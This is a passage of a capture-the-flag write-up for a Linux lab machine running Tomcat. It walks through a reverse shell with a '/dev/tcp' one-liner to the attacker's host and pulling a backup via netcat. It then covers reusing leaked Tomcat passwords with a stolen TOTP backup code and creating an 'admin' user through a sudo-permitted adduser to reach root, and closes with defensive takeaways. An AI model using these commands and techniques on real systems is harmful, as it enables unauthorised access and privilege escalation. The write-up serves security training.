proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
systemd-network:x:101:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:102:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:104::/nonexistent:/usr/sbin/nologin
systemd-timesync:x:104:105:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
pollinate:x:105:1::/var/cache/pollinate:/bin/false
sshd:x:106:65534::/run/sshd:/usr/sbin/nologin
syslog:x:107:113::/home/syslog:/usr/sbin/nologin
uuidd:x:108:114::/run/uuidd:/usr/sbin/nologin
tcpdump:x:109:115::/nonexistent:/usr/sbin/nologin
tss:x:110:116:TPM software stack,,,:/var/lib/tpm:/bin/false
landscape:x:111:117::/var/lib/landscape:/usr/sbin/nologin
fwupd-refresh:x:112:118:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin
usbmux:x:113:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
karl:x:1000:1000:karl green:/home/karl:/bin/bash
lxd:x:999:100::/var/snap/lxd/common/lxd:/bin/false
tomcat:x:1001:1001::/opt/tomcat:/bin/false
useradmin:x:1002:1002:,,,:/home/useradmin:/bin/bash
_laurel:x:998:998::/var/log/laurel:/bin/false
```

```
tomcat:x:1001:1001::/opt/tomcat:/bin/false
```

The user flag is at `/opt/tomcat/user.txt`:
```
[tomcat@10.129.234.57 /home]$ cat /opt/tomcat/user.txt
<REDACTED>
```

<br>

### Converting to a reverse shell
Tonka executes single commands. That’s fine, but a proper TTY is nicer:

On my box:
```bash
❯ penelope
[+] Listening for reverse shells on 0.0.0.0:4444 →  127.0.0.1 • 192.168.226.139 • 172.17.0.1 • 172.18.0.1 • 10.10.xx.xx
➤  🏠 Main Menu (m) 💀 Payloads (p) 🔄 Clear (Ctrl-L) 🚫 Quit (q/Ctrl-C)
[+] Got reverse shell from manage~10.129.xx.xx-Linux-x86_64 😍️ Assigned SessionID <1>
[+] Attempting to upgrade shell to PTY...
[+] Shell upgraded successfully using /usr/bin/python3! 💪
[+] Interacting with session [1], Shell Type: PTY, Menu key: F12 
[+] Logging to /home/kali/.penelope/sessions/manage~10.129.234.57-Linux-x86_64/2025_10_07-00_07_47-744.log 📜
────────────────────────────────────────────────────────────────────────────────
tomcat@manage:/home$ 
```

From the Tonka shell:

```bash
[tomcat@10.129.234.57 /home]$ bash -c 'bash -i >& /dev/tcp/10.10.xx.xx/4444 0>&1'
```

Penelope automatically updates the shell. I got a post talking about this tool already.

<br>

# Lateral Movement
### Local users and home dirs
Quick checks:
```bash
ls /home
cat /etc/passwd | grep 'sh$'
```

Two human users stood out, e.g. `karl` and `useradmin`. Surprisingly, world-readable bits allowed me to list both homes. `karl` had nothing interesting. `useradmin` had two very interesting indicators:
- `~/.google_authenticator` existed (suggests TOTP hardening is in play).
- `~/backups/backup.tar.gz` was world-readable.

Download it locally.
```
tomcat@manage:/home/useradmin/backups$ ls -lh
total 4.0K
-rw-rw-r-- 1 useradmin useradmin 3.1K Jun 21  2024 backup.tar.gz

# On kali
❯ nc -lvnp 5555 > backup.tar.gz

# On Tomcat
tomcat@manage:/home/useradmin/backups$ nc 10.10.xx.xx 5555 < backup.tar.gz
```

<br>

### Mining the backup
I copied and extracted it.
```bash
❯ ls -lah
drwxrwxr-x kali kali 4.0 KB Tue Oct  7 00:13:05 2025  .
drwxrwxr-x kali kali 4.0 KB Tue Oct  7 00:13:05 2025  ..
drwx------ kali kali 4.0 KB Tue Oct  7 00:13:05 2025 󰃨 .cache
drwxrwxr-x kali kali 4.0 KB Tue Oct  7 00:13:05 2025 󰢬 .ssh
lrwxrwxrwx kali kali   9 B  Tue Oct  7 00:13:05 2025  .bash_history ⇒ /dev/null
.rw-r--r-- kali kali 220 B  Fri Jun 21 17:46:55 2024 󱆃 .bash_logout
.rw-r--r-- kali kali 3.7 KB Fri Jun 21 17:46:55 2024 󱆃 .bashrc
.r-------- kali kali 200 B  Fri Jun 21 18:48:52 2024  .google_authenticator
.rw-r--r-- kali kali 807 B  Fri Jun 21 17:46:55 2024  .profile
```

Inside were Google Authenticator artifacts-backup codes and the TOTP secret seed. That means:
- If we know `useradmin`’s password, we can satisfy the second factor using a backup code, or
- We can generate valid TOTPs locally with the seed.

<br>

### Password reuse from Tomcat users
Remember the Tomcat `UserDatabase` creds dumped via JMX? Those passwords often get reused by administrators across local accounts. I tried them against `useradmin` via `su` from the `tomcat` shell:

```bash
su - useradmin
# try first password: fhErvo2r9wuTEYiYgt → auth failure
# try second password: onyRPCkaG4iX72BrRtKgbszd → prompts for "Verification code"
```

When prompted for the TOTP code, I supplied a **backup code** from the archive and got a shell as `useradmin`.
```
❯ cat .google_authenticator
───────┬────────────────────────────────
       │ File: .google_authenticator
───────┼────────────────────────────────
   1   │ CLSSSMHYGLENX5HAIFBQ6L35UM
   2   │ " RATE_LIMIT 3 30 1718988529
   3   │ " WINDOW_SIZE 3
   4   │ " DISALLOW_REUSE 57299617
   5   │ " TOTP_AUTH
   6   │ 99852083
   7   │ 20312647
   8   │ 73235136
   9   │ 92971994
  10   │ 86175591
  11   │ 98991823
  12   │ 54032641
  13   │ 69267218
  14   │ 76839253
  15   │ 56800775
───────┴────────────────────────────────
```

```
tomcat@manage:/home/useradmin/backups$ su - useradmin
Password: 
Verification code: 
useradmin@manage:~$
```

# Privilege Escalation
### Sudoers check
First move as any new user:
```bash
useradmin@manage:~$ sudo -l
Matching Defaults entries for useradmin on manage:
    env_reset, timestamp_timeout=1440, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User useradmin may run the following commands on manage:
    (ALL : ALL) NOPASSWD: /usr/sbin/adduser ^[a-zA-Z0-9]+$
```

Output allowed running `adduser` **without a password**, constrained by a regex to a single alphanumeric argument:
Interpretation: I can run `/usr/sbin/adduser <one_word>` as root, but I can’t pass options or multiple args. That still lets me create arbitrary local users.

<br>

## Checking groups
```
useradmin@manage:~$ cat /etc/group
root:x:0:
daemon:x:1:
bin:x:2:
sys:x:3:
adm:x:4:syslog,karl
tty:x:5:
disk:x:6:
lp:x:7:
mail:x:8:
news:x:9:
uucp:x:10:
man:x:12:
proxy:x:13:
kmem:x:15:
dialout:x:20:
fax:x:21:
voice:x:22:
cdrom:x:24:karl
floppy:x:25:
tape:x:26:
sudo:x:27:karl
audio:x:29:
dip:x:30:karl
www-data:x:33:
backup:x:34:
operator:x:37:
list:x:38:
irc:x:39:
src:x:40:
gnats:x:41:
shadow:x:42:
utmp:x:43:
video:x:44:
sasl:x:45:
plugdev:x:46:karl
staff:x:50:
games:x:60:
users:x:100:
nogroup:x:65534:
systemd-journal:x:101:
systemd-network:x:102:
systemd-resolve:x:103:
messagebus:x:104:
systemd-timesync:x:105:
input:x:106:
sgx:x:107:
kvm:x:108:
render:x:109:
lxd:x:110:karl
_ssh:x:111:
crontab:x:112:
syslog:x:113:
uuidd:x:114:
tcpdump:x:115:
tss:x:116:
landscape:x:117:
fwupd-refresh:x:118:
karl:x:1000:
tomcat:x:1001:
useradmin:x:1002:
netdev:x:119:
_laurel:x:998:
```

There is no admin group!

By default, the `admin` group has extensive sudo privilieges on ubuntu machines like this one, but here we can't check the sudoers so we are trying blindly.

<br>

## Admin user creation
```
useradmin@manage:~$ sudo adduser admin
Adding user `admin' ...
Adding new group `admin' (1003) ...
Adding new user `admin' (1003) with group `admin' ...
Creating home directory `/home/admin' ...
Copying files from `/etc/skel' ...
New password: 
Retype new password: 
passwd: password updated successfully
Changing the user information for admin
Enter the new value, or press ENTER for the default
	Full Name []: 
	Room Number []: 
	Work Phone []: 
	Home Phone []: 
	Other []: 
Is the information correct? [Y/n] 
useradmin@manage:~$ su admin
Password: 
To run a command as administrator (user "root"), use "sudo <command>".
See "man sudo_root" for details.

admin@manage:/home/useradmin$
```

```
admin@manage:/home/useradmin$ sudo -l
[sudo] password for admin: 
Matching Defaults entries for admin on manage:
    env_reset, timestamp_timeout=1440, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User admin may run the following commands on manage:
    (ALL) ALL
```

<br>

### Shell as root
```
admin@manage:/home/useradmin$ sudo su
root@manage:/home/useradmin# id
uid=0(root) gid=0(root) groups=0(root)
```

#### Root flag
```
root@manage:/home/useradmin# cat /root/root.txt
<REDACTED>
root@manage:/home/useradmin# 
```

<br>
<br>

# Takeaways & Defensive Notes

- **RMI/JMX exposure**: Treat JMX like SSH-it’s a remote admin surface. If it must be exposed, bind to localhost or enforce authentication with robust network segmentation.
- **Tomcat `UserDatabase`**: Storing cleartext passwords in a live memory-backed realm bites hard when JMX is open. Prefer external identity backends and least-privilege roles.
- **2FA backups**: Backup codes and TOTP seeds are credentials. Don’t store them world-readable on shared hosts, and don’t keep them on the same machine you’re protecting.
- **Sudoers regex wrappers**: Even “tight” allowlists can be exploitable if the allowed binary has side effects. Here, a single-argument `adduser` created a group that policy mapped to full `sudo`
- **Password reuse**: Cross-surface reuse (Tomcat app → Unix account) is still one of the most reliable real-world attack paths.

---
---